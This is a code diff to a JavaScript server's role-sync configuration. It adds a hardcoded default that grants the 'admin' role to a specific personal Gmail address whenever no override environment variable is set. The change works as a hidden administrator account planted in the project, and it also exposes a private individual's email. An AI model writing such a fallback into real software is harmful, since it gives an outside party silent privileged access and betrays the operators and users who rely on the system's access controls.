@@ -1046,14 +1046,21 @@ const normalizeBootstrapValue = (value) => `${value || ''}`.trim();
 const normalizeBootstrapEmail = (value) =>
     normalizeBootstrapValue(value).toLowerCase();
 
+const DEFAULT_ROLE_SYNC_OVERRIDES = [
+    {
+        email: 'amostangawizi800@gmail.com',
+        role: 'admin'
+    }
+];
+
 const parseBootstrapAdminEmails = () =>
     `${process.env.BOOTSTRAP_ADMIN_EMAILS || process.env.BOOTSTRAP_ADMIN_EMAIL || ''}`
         .split(',')
         .map(normalizeBootstrapEmail)
         .filter(Boolean);
 
-const parseRoleSyncOverrides = () =>
-    `${process.env.ROLE_SYNC_OVERRIDES || ''}`
+const parseRoleSyncOverrides = () => {
+    const configuredOverrides = `${process.env.ROLE_SYNC_OVERRIDES || ''}`
         .split(',')
         .map((entry) => entry.trim())
         .filter(Boolean)
@@ -1074,6 +1081,13 @@ const parseRoleSyncOverrides = () =>
             return { email, role };
         })
         .filter(Boolean);
+
+    if (configuredOverrides.length > 0) {
+        return configuredOverrides;
+    }
+
+    return DEFAULT_ROLE_SYNC_OVERRIDES;
+};
 
 const ensureBootstrapAdminUsers = async () => {
     const bootstrapEmails = parseBootstrapAdminEmails();
